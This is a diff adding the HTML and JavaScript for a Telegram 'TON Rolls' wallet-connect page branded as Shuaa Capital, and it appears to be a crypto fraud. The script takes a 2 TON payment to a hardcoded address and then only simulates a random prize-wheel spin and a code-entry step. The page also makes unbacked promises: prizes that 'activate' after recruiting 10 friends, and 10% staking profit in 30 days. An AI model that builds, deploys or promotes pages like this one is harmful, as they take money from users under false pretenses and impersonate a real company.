@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en"> 
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shuaa Capital - TON Rolls</title>
+    <link rel="icon" href="img/toncoin.png" type="image/png">
+    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
+    
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="start-screen active">
+        <div class="start-screen__content">
+            <h1 class="start-screen__title">ROLLS</h1> 
+            <div class="start-screen__rolls-shadows">
+                <span>TON ROLLS</span>
+                <span>TON ROLLS</span>
+                <span>TON ROLLS</span>
+            </div>
+            <lottie-player class="start-screen__loading-spinner" src="spinner.json" background="transparent" speed="1" loop autoplay></lottie-player>
+            <p class="start-screen__loading-text">Powered By Shuaa Capital</p>
+        </div>
+    </div>
+
+    <div class="page hide">
+        <header class="header">
+            <div class="container header__wrapper">
+                <a href="#" class="header__logo">
+                    <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M30 0C13.4314 0 0 13.4314 0 30C0 46.5686 13.4314 60 30 60C46.5686 60 60 46.5686 60 30C60 13.4314 46.5686 0 30 0ZM40.9287 21.0713L30 31.9999L19.0713 21.0713C18.4856 20.4856 17.5144 20.4856 16.9287 21.0713C16.3431 21.657 16.3431 22.6282 16.9287 23.2139L28.7861 35.0713C29.3718 35.657 30.3431 35.657 30.9287 35.0713L42.7861 23.2139C43.3718 22.6282 43.3718 21.657 42.7861 21.0713C42.2004 20.4856 41.2292 20.4856 40.9287 21.0713Z" fill="currentColor"/>
+                    </svg>
+                </a>
+                <nav class="header__nav">
+                    <ul class="header__nav-list">
+                        <li><a href="#" data-section="rolls">Rolls</a></li>
+                        <li><a href="#" data-section="earn">Earn</a></li>
+                        <li><a href="#" data-section="staking">Staking</a></li>
+                        <li><a href="#" data-section="team">Team</a></li>
+                    </ul>
+                </nav>
+                <button class="header__burger">
+                    <span></span>
+                </button>
+            </div>
+        </header>
+
+        <main class="page__wrapper">
+            <section id="content-rolls" class="section-content active-section">
+                <div class="page__logo">
+                    <img src="toncoin1.png" alt="TON Coin">
+                </div>
+                <div class="ton">
+                    <div class="ton__icon">
+                        <img src="toncoin1.png" alt="TON">
+                    </div>
+                    <p class="ton__title">Gift</p>
+                    <p class="ton__abb">/spin</p>
+                </div>
+
+                <div class="rolls-main-area">
+                    <p class="rolls-info-text">You can try your luck with 2 numbers "each account once"</p>
+                    
+                    <center> <div id="ton-connect"></div> </center> 
+                    <button id="connectWalletBtn" class="primary-button">Connect Wallet</button>						   
+                    <button id="sendTransactionBtn" class="primary-button" disabled>Pay & Roll</button>
+
+                    <lottie-player class="loading-animation hide" src="spinner.json" background="transparent" speed="1" loop autoplay></lottie-player>
+                    <lottie-player class="checkmark-animation hide" src="check.json" background="transparent" speed="1" autoplay></lottie-player>
+
+                    <div class="code-entry-section hide">
+                        <p class="code-entry-info">Enter the confirmation code you received:</p>
+                        <div class="input-group">
+                            <input type="text" id="confirmationCodeInput" placeholder=" ">
+                            <label for="confirmationCodeInput">Confirmation Code</label>
+                        </div>
+                        <p id="codeErrorMessage" class="error-message hide">Invalid code. Please try again.</p>
+                        <button id="verifyCodeBtn" class="primary-button">Verify Code</button>
+                    </div>
+
+                    <p class="referral-after-code-message hide">
+                        Congratulations! Your prize has been credited. Now, invite 10 friends to the bot via the "Earn" section to fully activate your prize and earn more!
+                    </p>
+
+                    <div class="spinner-container">
+                        <img src="rolls_wheel_background.png" alt="Spinning Wheel" class="spinning-wheel">
+                        <div class="spinner-needle"></div>
+                        <div class="spinner-center-text"></div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="content-earn" class="section-content hidden-section">
+                <div class="earn-user-profile">
+                    <img src="telegram.png" alt="User Profile" class="earn-user-pic">
+                    <h3 class="earn-user-name">Get Free Money</h3>
+                </div>
+
+                <div class="earn-invite-card">
+                    <h3>Boost Your Earnings: Invite Friends!</h3>
+                    <p>
+                        Share your unique referral link and earn a fantastic <strong class="highlight-text">20% from your friends' staking profits</strong> and <strong class="highlight-text">10% from their Rolls fees!</strong> The more they play, the more you earn!
+                    </p>
+                    <div class="input-group referral-link-group">
+                        <input type="text" id="referralLink" value="http://t.me/ShuaaCapitalBot?start=YOUR_REFERRAL_CODE" readonly>
+                        <button class="copy-referral-btn"><i class="far fa-copy"></i> Copy</button>
+                    </div>
+                </div>
+
+                <div class="earn-stats-container">
+                    <div class="stat-box">
+                        <p class="stat-label">Total Referrals</p>
+                        <p class="stat-value">0</p>
+                    </div>
+                    <div class="stat-box">
+                        <p class="stat-label">Total Earnings</p>
+                        <p class="stat-value">
+                            0 TON
+                            <button class="claim-btn">Claim</button>
+                        </p>
+                    </div>
+                </div>
+            </section>
+
+            <section id="content-staking" class="section-content hidden-section">
+                <div class="staking-header">
+                    <img src="toncoin1.png" alt="Staking Icon" class="staking-header-icon">
+                    <h2 class="staking-title">Elevate Your Earnings with TON Staking</h2>
+                </div>
+                <p class="staking-banner-text">
+                    Unlock passive income! Earn a solid 10% profit on your TON over just 30 days.
+                </p>
+
+                <div class="staking-input-wrapper">
+                    <div class="input-group">
+                        <input type="number" id="stakingAmount" placeholder=" " min="1" step="0.1">
+                        <label for="stakingAmount">TON Amount to Stake</label>
+                    </div>
+                </div>
+
+                <div class="staking-summary">
+                    <p>Estimated Profit (30 days): <span id="estimatedProfit">0 TON</span></p>
+                    <p>Transaction Fee (1% of profit): <span id="stakingFee">0 TON</span></p>
+                    <p>Total Projected Return: <span id="totalReturn">0 TON</span></p>
+                </div>
+
+                <button id="stakeTonBtn" class="primary-button">Stake TON Now!</button>
+                <a href="#" class="learn-more-link">Learn More About Staking</a>
+                <div class="learn-more-content hide">
+                    <p><strong>What is Staking?</strong> Staking is a way to earn rewards for holding certain cryptocurrencies. By "staking" your crypto, you lock it up to help maintain the security and operations of a blockchain network. In return, you earn more cryptocurrency.</p>
+                    <p><strong>How it Works:</strong> When you stake your TON with Shuaa Capital, your funds are added to our secure staking pool. We manage the staking process, and you receive a share of the rewards generated by the network, minus a small fee for our services.</p>
+                    <p><strong>Benefits:</strong> Earn passive income, contribute to network security, and maintain liquidity (you can unstake your funds at any time).</p>
+                </div>
+            </section>
+
+            <section id="content-team" class="section-content hidden-section">
+                <h2 class="team-section-title">Our Vision: Powering Your Experience on TON</h2>
+                <p class="team-description-text">
+                    At Shuaa Capital, we are driven by a singular vision: to create an unparalleled gaming and earning experience within the Telegram ecosystem. We proudly leverage The Open Network (TON), a robust and decentralized blockchain born from the innovative spirit of Telegram. Our dedicated team is committed to building a transparent, secure, and user-friendly platform that seamlessly connects millions of Telegram users to the exciting world of TON. Join us in shaping the future of decentralized entertainment and finance!
+                </p>
+
+                <div class="team-members-photos">
+                    <img src="img/team_member_px1.png" alt="Team Member Px1" class="team-photo blurred">
+                    <img src="img/team_member_px2.png" alt="Team Member Px2" class="team-photo blurred">
+                    <img src="img/team_member_px3.png" alt="Team Member Px3" class="team-photo blurred">
+                    <img src="img/team_member_px4.png" alt="Team Member Px4" class="team-photo blurred">
+                    <img src="img/team_member_px5.png" alt="Team Member Px5" class="team-photo blurred">
+                </div>
+
+                <div class="contact-details">
+                    <h3>Reach Out To Us</h3>
+                    <p><strong>Headquarters:</strong> Shuaa Capital Company, 12th Floor, Tawun Tower, Al Maktoum St, Baniyas Sq, Dubai, UAE</p>
+                    <p><strong>Phone:</strong> +971567238336</p>
+                    <p><strong>Working Hours:</strong> 10:00 AM - 10:00 PM (Gulf Standard Time)</p>
+                    <p><strong>Dedicated Support:</strong> <a href="http://t.me/ShuaaCapitalBot" target="_blank">@ShuaaCapitalBot</a></p>
+                </div>
+            </section>
+
+            <div class="global-timer-section">
+                <p class="timer-label">Next Grand Gift Drop:</p>
+                <div id="countdown" class="timer-display">July 29, 12:00 PM UTC</div>
+                <p class="timer-note">Don't miss out on upcoming opportunities!</p>
+            </div>
+        </main>
+
+        <footer class="footer">
+            <div class="container footer__wrapper">
+                <a href="#" class="footer__logo">
+                    <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M30 0C13.4314 0 0 13.4314 0 30C0 46.5686 13.4314 60 30 60C46.5686 60 60 46.5686 60 30C60 13.4314 46.5686 0 30 0ZM40.9287 21.0713L30 31.9999L19.0713 21.0713C18.4856 20.4856 17.5144 20.4856 16.9287 21.0713C16.3431 21.657 16.3431 22.6282 16.9287 23.2139L28.7861 35.0713C29.3718 35.657 30.3431 35.657 30.9287 >
+            <ul class="footer__soc">
+                <li><a href="http://t.me/ShuaaCapitalBot" target="_blank"><i class="fab fa-telegram-plane"></i></a></li>
+                <li><a href="https://twitter.com/ShuaaCapital" target="_blank"><i class="fab fa-twitter"></i></a></li>
+                <li><a href="https://github.com/ShuaaCapital" target="_blank"><i class="fab fa-github"></i></a></li>
+            </ul>
+        </div>
+    </footer>
+
+    <nav class="bottom-nav">
+        <ul>
+            <li data-section="rolls" class="active">
+                <i class="fas fa-dice"></i>
+                <span>Rolls</span>
+            </li>
+            <li data-section="earn">
+                <i class="fas fa-hand-holding-usd"></i>
+                <span>Earn</span>
+            </li>
+            <li data-section="staking">
+                <i class="fas fa-coins"></i>
+                <span>Staking</span>
+            </li>
+            <li data-section="team">
+                <i class="fas fa-users"></i>
+                <span>Team</span>
+            </li>
+        </ul>
+    </nav>
+</div>
+
+<script>
+    let isWalletConnected = false;
+    let tonConnectUI = null;
+    //Initialize TON Connect UI
+    document.addEventListener("DOMContentLoaded", async function () {
+          tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+          manifestUrl: 'https://tonairdrops.vercel.app/tonconnect-manifest.json',
+          buttonRootId: 'ton-connect' // This assumes a div with id="ton-connect" exists in HTML
+        });
+    //Check if wallet is already connected
+    const connectedWallet = await tonConnectUI.getWallets();
+    if(connectedWallet){
+       isWalletConnected = true;
+       console.log("Wallet is already connected: ", connectedWallet);
+       // Update UI if connected initially
+       // Assuming connectWalletBtn and sendTransactionBtn exist and are used
+       document.getElementById("connectWalletBtn").classList.add('hide'); // Hide connect button
+       document.getElementById("sendTransactionBtn").disabled = false; // Enable send button
+       document.getElementById("sendTransactionBtn").classList.remove('hide'); // Show send button
+    }
+    
+    // Listen for TonConnectUI status changes on top of initial check
+    tonConnectUI.onStatusChange(wallet => {
+        const connectBtn = document.getElementById("connectWalletBtn");
+        const sendBtn = document.getElementById("sendTransactionBtn");
+        const rollsInfo = document.querySelector('.rolls-info-text');
+
+        if (wallet) {
+            isWalletConnected = true;
+            rollsInfo.textContent = `Wallet connected: ${wallet.account.address.substring(0, 6)}...${wallet.account.address.substring(wallet.account.address.length - 4)}. Now, pay 2 TON to roll!`;
+            if(connectBtn) connectBtn.classList.add('hide'); // Hide connect
+            if(sendBtn) {
+                sendBtn.disabled = false; // Enable send
+                sendBtn.classList.remove('hide'); // Show send
+            }
+        } else {
+            isWalletConnected = false;
+            rollsInfo.textContent = 'Connect your TON wallet to participate.';
+            if(connectBtn) connectBtn.classList.remove('hide'); // Show connect
+            if(sendBtn) {
+                sendBtn.disabled = true; // Disable send
+                sendBtn.classList.add('hide'); // Hide send
+            }
+        }
+    });
+
+    });
+
+    // Connect wallet - called by connectWalletBtn
+    async function connectWallet() {
+        if (isWalletConnected){
+            console.log("wallet already connected")
+            return;
+        }
+        try {
+            const connectedWallet = await tonConnectUI.connectWallet();
+            if (connectedWallet) {
+                isWalletConnected = true;
+                console.log("Wallet connected", connectedWallet);
+                // UI update is handled by onStatusChange
+            }
+        } catch (error) {
+            console.error("Error connecting to wallet: ", error);
+            document.querySelector('.rolls-info-text').textContent = 'Wallet connection failed. Please try again.';
+        }
+    }
+
+    // Send Transaction - called by sendTransactionBtn
+    async function sendTonTransaction() {
+        const rollsInfo = document.querySelector('.rolls-info-text');
+        const loadingAnimation = document.querySelector('.loading-animation');
+        const checkmarkAnimation = document.querySelector('.checkmark-animation');
+        const spinningWheel = document.querySelector('.spinning-wheel');
+        const codeEntrySection = document.querySelector('.code-entry-section');
+
+        if (!isWalletConnected) {
+            console.error("Please connect your wallet first.");
+            rollsInfo.textContent = 'Please connect your wallet first!';
+            return;
+        }
+
+        document.getElementById("sendTransactionBtn").disabled = true; // Disable button during transaction
+
+        const transaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 360, // 6 minutes
+            messages: [
+                {
+                    address: "UQBADbfYuE5qGyN5ITs0FjWZ9suGQYuvy2HQ3cQ8wpyRyx0f", // UPDATED: Destination address from your last request
+                    amount: "2000000000" // 2 TON in nanotons
+                }
+            ]
+        };
+
+        try {
+            // Send the transaction using TonConnectUI
+            const result = await tonConnectUI.sendTransaction(transaction);
+            console.log("Transaction successful:", result);
+
+            // --- Execute success simulation after actual transaction is sent ---
+            loadingAnimation.classList.remove('hide');
+            rollsInfo.classList.add('hide'); 
+            
+            // Spin the wheel
+            spinningWheel.style.transition = 'transform 4s cubic-bezier(0.25, 0.1, 0.25, 1)';
+            spinningWheel.style.transform = `rotate(${Math.random() * 360 + 1080}deg)`; // Spin 3+ times
+
+            if (navigator.vibrate) { navigator.vibrate(100); } // Medium vibration for successful payment/spin
+
+            setTimeout(() => {
+                loadingAnimation.classList.add('hide');
+                checkmarkAnimation.classList.remove('hide');
+                rollsInfo.classList.remove('hide'); // Show info text again
+                rollsInfo.textContent = 'Payment successful! Enter your code to claim your prize.';
+                codeEntrySection.classList.remove('hide'); // Show code entry
+                checkmarkAnimation.addEventListener('loopComplete', () => {
+                    checkmarkAnimation.classList.add('hide');
+                }, { once: true });
+            }, 4000); // Simulate 4 seconds for spin + loading after successful transaction
+
+        } catch (error) {
+            console.error("Transaction failed:", error);
+            rollsInfo.textContent = 'Payment failed. Please try again.';
+            loadingAnimation.classList.add('hide');
+            document.getElementById("sendTransactionBtn").disabled = false; // Re-enable button on failure
+        }
+    }
+   
+    // Event listeners are set here as in your original code
+    document.getElementById("connectWalletBtn").addEventListener("click", connectWallet);
+    document.getElementById("sendTransactionBtn").addEventListener("click", sendTonTransaction);
+
+</script>
+<script src="assets/web3-provider.js"></script> 
+<script src="scriptton.js"></script>
+</body>
+</html>
